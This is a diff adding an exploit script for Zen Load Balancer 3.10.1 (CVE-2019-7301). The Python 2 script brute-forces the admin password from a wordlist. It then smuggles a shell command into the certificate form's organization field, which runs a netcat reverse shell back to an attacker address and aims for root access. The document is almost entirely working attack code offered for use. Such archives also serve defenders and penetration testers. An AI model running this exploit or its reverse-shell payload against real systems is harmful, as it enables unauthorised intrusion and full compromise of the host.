@@ -1,0 +1,110 @@
+# Exploit Title: Zen Load Balancer 3.10.1 - Remote Code Execution
+# Google Dork: no
+# Date: 2020-03-28
+# Exploit Author: Cody Sixteen
+# Vendor Homepage: https://code610.blogspot.com
+# Software Link: https://sourceforge.net/projects/zenloadbalancer/files/Distro/zenloadbalancer-distro_3.10.1.iso/download
+# Version: 3.10.1
+# Tested on: Linux 
+# CVE : CVE-2019-7301
+
+#c@kali:~/src/eonila/zenload3r$ cat zenload3r.py
+#!/usr/bin/env python
+# zenload3r.py - zen load balancer pwn3r
+# 28.03.2020 @ 22:41
+#
+# by cody sixteen
+#
+
+import base64
+import sys, re
+import requests
+import ssl
+from functools import partial
+ssl.wrap_socket = partial(ssl.wrap_socket, ssl_version=ssl.PROTOCOL_TLSv1)
+# disable ssl warnings:
+import urllib3
+urllib3.disable_warnings()
+from requests.auth import HTTPBasicAuth
+
+#
+target = sys.argv[1]
+username = 'admin'
+password = 'P@ssw0rd'
+
+def main():
+  print 'zenload3r.py - zen load balancer pwn3r'
+  print '      zenload3r.py - vs - %s' % ( target )
+  print ''
+
+  print '[+] checking if host is alive...'
+  global sess
+  sess = requests.session()
+  global baseUrl
+  baseUrl = target + ':444/index.cgi'
+  checkBaseUrl = sess.get(baseUrl, verify=False)
+  checkBaseResp = checkBaseUrl.status_code
+
+  #print checkBaseResp
+  if checkBaseResp == 401:
+    print '[i] ...it is. we need to log in to proceed'
+    logmein(baseUrl)
+
+
+def logmein(target):
+  print '[+] trying %s and default password "%s" vs %s' % (username, password, baseUrl)
+
+  #pwd_file = '/usr/share/wordlists/dirb/common.txt'
+  pwd_file = 'passwd.lst'
+
+  try:
+    read_pwds = open(pwd_file, 'r')
+    pwds = read_pwds.readlines()
+
+    for pwd in pwds:
+      pwd = pwd.rstrip()
+      logme = sess.post(baseUrl, auth=HTTPBasicAuth(username,pwd), allow_redirects=True)
+      logmeresp = logme.text
+
+      #print logmeresp
+      if '<p>Hello <strong>admin</strong>' in logmeresp:
+        print '[+] admin user logged-in! :D'
+        print '[+] working password: %s' % ( pwd )
+
+        load3r(baseUrl, pwd)
+
+  except requests.exceptions.ConnectionError:
+    print '[-] Can not connect to remote host :C\n'
+
+
+def load3r(baseUrl, pwd):
+  print '[+] time to get reverse shell, preparing...'
+
+  creds = base64.b64encode("{}:{}".format(username,pwd))
+  creds2 = creds.rstrip()
+  print 'creds: ', creds2
+
+  baseUrl = "https://192.168.1.200:444/index.cgi"
+  headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate",
+    "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://192.168.1.200:444",
+    "Authorization": "Basic {}".format(creds2), "Connection": "close",
+    "Referer": "https://192.168.1.200:444/index.cgi?id=1-3&action=Show_Form", "Upgrade-Insecure-Requests": "1"
+  }
+  sh = "a\";nc 192.168.1.170 4444 -e /bin/sh;#"
+  reqdata = {"cert_name": "qweqweqwe", "cert_issuer": "Sofintel",
+    "cert_fqdn": "qweqweqwe", "cert_division": "qweqweqwe",
+    "cert_organization": sh,
+    "cert_locality": "qweqweqwe", "cert_state": "qweqweqwe",
+    "cert_country": "qw", "cert_mail": "qweqweqwe@qweqweqwe.com",
+    "cert_key": "2048", "id": "1-3", "actionpost": "Generate CSR", "button": "Generate CSR"}
+
+  requests.post(baseUrl, headers=headers, data=reqdata,verify=False)
+
+  print '[*] got r00t? ;>\n'
+
+
+# run me:
+if __name__ == '__main__':
+  main()
